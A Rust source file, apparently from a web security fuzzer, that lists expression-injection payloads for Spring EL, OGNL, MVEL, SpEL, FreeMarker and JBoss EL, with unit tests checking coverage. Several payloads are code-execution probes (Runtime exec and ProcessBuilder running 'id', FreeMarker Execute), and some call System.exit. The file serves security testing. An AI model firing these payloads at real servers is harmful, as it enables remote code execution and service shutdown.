use crate::fuzzer::payloads::{Payload, PayloadType, Severity};

pub fn get_payloads() -> Vec<Payload> {
    let mut payloads = Vec::new();

    payloads.push(Payload {
        payload_type: PayloadType::Expression,
        payload: "${'1'.concat('1')}".to_string(),
        description: "Spring EL concat".to_string(),
        severity: Severity::Critical,
        tags: vec!["spring-el".to_string(), "expression".to_string()],
    });
    payloads.push(Payload {
        payload_type: PayloadType::Expression,
        payload: "${'a' + 'b'}".to_string(),
        description: "Spring EL string concatenation".to_string(),
        severity: Severity::Critical,
        tags: vec!["spring-el".to_string(), "expression".to_string()],
    });
    payloads.push(Payload {
        payload_type: PayloadType::Expression,
        payload: "${1 + 1}".to_string(),
        description: "Spring EL arithmetic".to_string(),
        severity: Severity::High,
        tags: vec!["spring-el".to_string(), "expression".to_string()],
    });
    payloads.push(Payload {
        payload_type: PayloadType::Expression,
        payload: "${''.class.forName('java.lang.Runtime')}".to_string(),
        description: "Spring EL class.forName RCE".to_string(),
        severity: Severity::Critical,
        tags: vec!["spring-el".to_string(), "rce".to_string()],
    });
    payloads.push(Payload {
        payload_type: PayloadType::Expression,
        payload: "${''.class.getClassLoader()}".to_string(),
        description: "Spring EL classloader access".to_string(),
        severity: Severity::Critical,
        tags: vec!["spring-el".to_string(), "expression".to_string()],
    });
    payloads.push(Payload {
        payload_type: PayloadType::Expression,
        payload: "${T(java.lang.Runtime).getRuntime().exec('id')}".to_string(),
        description: "Spring EL Runtime exec".to_string(),
        severity: Severity::Critical,
        tags: vec!["spring-el".to_string(), "rce".to_string()],
    });
    payloads.push(Payload {
        payload_type: PayloadType::Expression,
        payload: "${T(java.lang.ProcessBuilder).start()}".to_string(),
        description: "Spring EL ProcessBuilder".to_string(),
        severity: Severity::Critical,
        tags: vec!["spring-el".to_string(), "rce".to_string()],
    });
    payloads.push(Payload {
        payload_type: PayloadType::Expression,
        payload: "${request.getClass().getClassLoader()}".to_string(),
        description: "Spring EL request classloader".to_string(),
        severity: Severity::Critical,
        tags: vec!["spring-el".to_string(), "expression".to_string()],
    });
    payloads.push(Payload {
        payload_type: PayloadType::Expression,
        payload: "${session.getClass().getClassLoader()}".to_string(),
        description: "Spring EL session classloader".to_string(),
        severity: Severity::Critical,
        tags: vec!["spring-el".to_string(), "expression".to_string()],
    });
    payloads.push(Payload {
        payload_type: PayloadType::Expression,
        payload: "${'1'.concat('1')}".to_string(),
        description: "OGNL concat".to_string(),
        severity: Severity::Critical,
        tags: vec!["ognl".to_string(), "expression".to_string()],
    });
    payloads.push(Payload {
        payload_type: PayloadType::Expression,
        payload: "${@java.lang.Runtime@getRuntime().exec('id')}".to_string(),
        description: "OGNL static method call".to_string(),
        severity: Severity::Critical,
        tags: vec!["ognl".to_string(), "rce".to_string()],
    });
    payloads.push(Payload {
        payload_type: PayloadType::Expression,
        payload: "${@java.lang.System@exit(1)}".to_string(),
        description: "OGNL System.exit".to_string(),
        severity: Severity::Critical,
        tags: vec!["ognl".to_string(), "expression".to_string()],
    });
    payloads.push(Payload {
        payload_type: PayloadType::Expression,
        payload: "${''.getClass().forName('java.lang.Runtime')}".to_string(),
        description: "OGNL class.forName".to_string(),
        severity: Severity::Critical,
        tags: vec!["ognl".to_string(), "rce".to_string()],
    });
    payloads.push(Payload {
        payload_type: PayloadType::Expression,
        payload: "${new java.lang.ProcessBuilder('id').start()}".to_string(),
        description: "OGNL ProcessBuilder".to_string(),
        severity: Severity::Critical,
        tags: vec!["ognl".to_string(), "rce".to_string()],
    });
    payloads.push(Payload {
        payload_type: PayloadType::Expression,
        payload: "${new java.lang.String('test')}".to_string(),
        description: "OGNL new String".to_string(),
        severity: Severity::Medium,
        tags: vec!["ognl".to_string(), "expression".to_string()],
    });
    payloads.push(Payload {
        payload_type: PayloadType::Expression,
        payload: "%{1+1}".to_string(),
        description: "OGNL arithmetic".to_string(),
        severity: Severity::High,
        tags: vec!["ognl".to_string(), "expression".to_string()],
    });
    payloads.push(Payload {
        payload_type: PayloadType::Expression,
        payload: "%{'a' + 'b'}".to_string(),
        description: "OGNL string concat".to_string(),
        severity: Severity::Critical,
        tags: vec!["ognl".to_string(), "expression".to_string()],
    });
    payloads.push(Payload {
        payload_type: PayloadType::Expression,
        payload: "%{''.class.forName('java.lang.Runtime')}".to_string(),
        description: "OGNL class.forName RCE".to_string(),
        severity: Severity::Critical,
        tags: vec!["ognl".to_string(), "rce".to_string()],
    });
    payloads.push(Payload {
        payload_type: PayloadType::Expression,
        payload: "%{request.getClass().getClassLoader()}".to_string(),
        description: "OGNL request classloader".to_string(),
        severity: Severity::Critical,
        tags: vec!["ognl".to_string(), "expression".to_string()],
    });
    payloads.push(Payload {
        payload_type: PayloadType::Expression,
        payload: "${1+1}".to_string(),
        description: "MVEL arithmetic".to_string(),
        severity: Severity::High,
        tags: vec!["mvel".to_string(), "expression".to_string()],
    });
    payloads.push(Payload {
        payload_type: PayloadType::Expression,
        payload: "${'a' + 'b'}".to_string(),
        description: "MVEL string concat".to_string(),
        severity: Severity::Critical,
        tags: vec!["mvel".to_string(), "expression".to_string()],
    });
    payloads.push(Payload {
        payload_type: PayloadType::Expression,
        payload: "${System.exit(1)}".to_string(),
        description: "MVEL System.exit".to_string(),
        severity: Severity::Critical,
        tags: vec!["mvel".to_string(), "expression".to_string()],
    });
    payloads.push(Payload {
        payload_type: PayloadType::Expression,
        payload: "${Runtime.getRuntime().exec('id')}".to_string(),
        description: "MVEL Runtime exec".to_string(),
        severity: Severity::Critical,
        tags: vec!["mvel".to_string(), "rce".to_string()],
    });
    payloads.push(Payload {
        payload_type: PayloadType::Expression,
        payload: "${new ProcessBuilder('id').start()}".to_string(),
        description: "MVEL ProcessBuilder".to_string(),
        severity: Severity::Critical,
        tags: vec!["mvel".to_string(), "rce".to_string()],
    });
    payloads.push(Payload {
        payload_type: PayloadType::Expression,
        payload: "#{'1'.concat('1')}".to_string(),
        description: "SpEL concat".to_string(),
        severity: Severity::Critical,
        tags: vec!["spel".to_string(), "expression".to_string()],
    });
    payloads.push(Payload {
        payload_type: PayloadType::Expression,
        payload: "#{1 + 1}".to_string(),
        description: "SpEL arithmetic".to_string(),
        severity: Severity::High,
        tags: vec!["spel".to_string(), "expression".to_string()],
    });
    payloads.push(Payload {
        payload_type: PayloadType::Expression,
        payload: "#{T(java.lang.Runtime).getRuntime().exec('id')}".to_string(),
        description: "SpEL Runtime exec".to_string(),
        severity: Severity::Critical,
        tags: vec!["spel".to_string(), "rce".to_string()],
    });
    payloads.push(Payload {
        payload_type: PayloadType::Expression,
        payload: "#{new java.lang.ProcessBuilder('id').start()}".to_string(),
        description: "SpEL ProcessBuilder".to_string(),
        severity: Severity::Critical,
        tags: vec!["spel".to_string(), "rce".to_string()],
    });
    payloads.push(Payload {
        payload_type: PayloadType::Expression,
        payload: "#{''.class.forName('java.lang.Runtime')}".to_string(),
        description: "SpEL class.forName".to_string(),
        severity: Severity::Critical,
        tags: vec!["spel".to_string(), "rce".to_string()],
    });
    payloads.push(Payload {
        payload_type: PayloadType::Expression,
        payload: "#{''.class.getClassLoader().loadClass('java.lang.Runtime')}".to_string(),
        description: "SpEL classloader".to_string(),
        severity: Severity::Critical,
        tags: vec!["spel".to_string(), "expression".to_string()],
    });
    payloads.push(Payload {
        payload_type: PayloadType::Expression,
        payload: "${1+1}".to_string(),
        description: "FreeMarker arithmetic".to_string(),
        severity: Severity::High,
        tags: vec!["freemarker".to_string(), "expression".to_string()],
    });
    payloads.push(Payload {
        payload_type: PayloadType::Expression,
        payload: "${'a' + 'b'}".to_string(),
        description: "FreeMarker concat".to_string(),
        severity: Severity::Critical,
        tags: vec!["freemarker".to_string(), "expression".to_string()],
    });
    payloads.push(Payload {
        payload_type: PayloadType::Expression,
        payload: "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}".to_string(),
        description: "FreeMarker Execute".to_string(),
        severity: Severity::Critical,
        tags: vec!["freemarker".to_string(), "rce".to_string()],
    });
    payloads.push(Payload {
        payload_type: PayloadType::Expression,
        payload: "${.data_model?api.getClass()}".to_string(),
        description: "FreeMarker ?api attack".to_string(),
        severity: Severity::Critical,
        tags: vec!["freemarker".to_string(), "expression".to_string()],
    });
    payloads.push(Payload {
        payload_type: PayloadType::Expression,
        payload: "${.vars}".to_string(),
        description: "FreeMarker .vars access".to_string(),
        severity: Severity::High,
        tags: vec!["freemarker".to_string(), "expression".to_string()],
    });
    payloads.push(Payload {
        payload_type: PayloadType::Expression,
        payload: "#{1 + 1}".to_string(),
        description: "JBoss EL arithmetic".to_string(),
        severity: Severity::High,
        tags: vec!["jboss-el".to_string(), "expression".to_string()],
    });
    payloads.push(Payload {
        payload_type: PayloadType::Expression,
        payload: "#{request.getClass().getClassLoader()}".to_string(),
        description: "JBoss EL request classloader".to_string(),
        severity: Severity::Critical,
        tags: vec!["jboss-el".to_string(), "expression".to_string()],
    });
    payloads.push(Payload {
        payload_type: PayloadType::Expression,
        payload: "#{session.getClass().getClassLoader()}".to_string(),
        description: "JBoss EL session classloader".to_string(),
        severity: Severity::Critical,
        tags: vec!["jboss-el".to_string(), "expression".to_string()],
    });
    payloads.push(Payload {
        payload_type: PayloadType::Expression,
        payload: "#{context.getClass().getClassLoader()}".to_string(),
        description: "JBoss EL context classloader".to_string(),
        severity: Severity::Critical,
        tags: vec!["jboss-el".to_string(), "expression".to_string()],
    });
    payloads.push(Payload {
        payload_type: PayloadType::Expression,
        payload: "${{1+1}}".to_string(),
        description: "Double brace bypass".to_string(),
        severity: Severity::High,
        tags: vec!["bypass".to_string(), "expression".to_string()],
    });
    payloads.push(Payload {
        payload_type: PayloadType::Expression,
        payload: "${(1+1)}".to_string(),
        description: "Parentheses arithmetic".to_string(),
        severity: Severity::Medium,
        tags: vec!["bypass".to_string(), "expression".to_string()],
    });

    payloads
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn payloads_non_empty() {
        let payloads = get_payloads();
        assert!(!payloads.is_empty(), "Expression injection payloads must not be empty");
    }

    #[test]
    fn all_payloads_are_expression_type() {
        for p in get_payloads() {
            assert_eq!(p.payload_type, PayloadType::Expression);
        }
    }

    #[test]
    fn contains_spel() {
        let payloads = get_payloads();
        let has_spel = payloads.iter().any(|p| p.payload.contains("#{"));
        assert!(has_spel, "Must contain SpEL payloads");
    }

    #[test]
    fn contains_ognl() {
        let payloads = get_payloads();
        let has_ognl = payloads.iter().any(|p| {
            p.payload.contains("@java.lang")
                || (p.payload.contains("%{") && p.payload.contains("Runtime"))
        });
        assert!(has_ognl, "Must contain OGNL payloads");
    }

    #[test]
    fn contains_runtime_exec() {
        let payloads = get_payloads();
        let has_exec = payloads.iter().any(|p| {
            p.payload.contains("exec(") || p.payload.contains("Runtime")
        });
        assert!(has_exec, "Must contain RCE payloads");
    }

    #[test]
    fn minimum_payload_count() {
        let payloads = get_payloads();
        assert!(
            payloads.len() >= 40,
            "Must have substantial expression injection coverage, got {}",
            payloads.len()
        );
    }
}
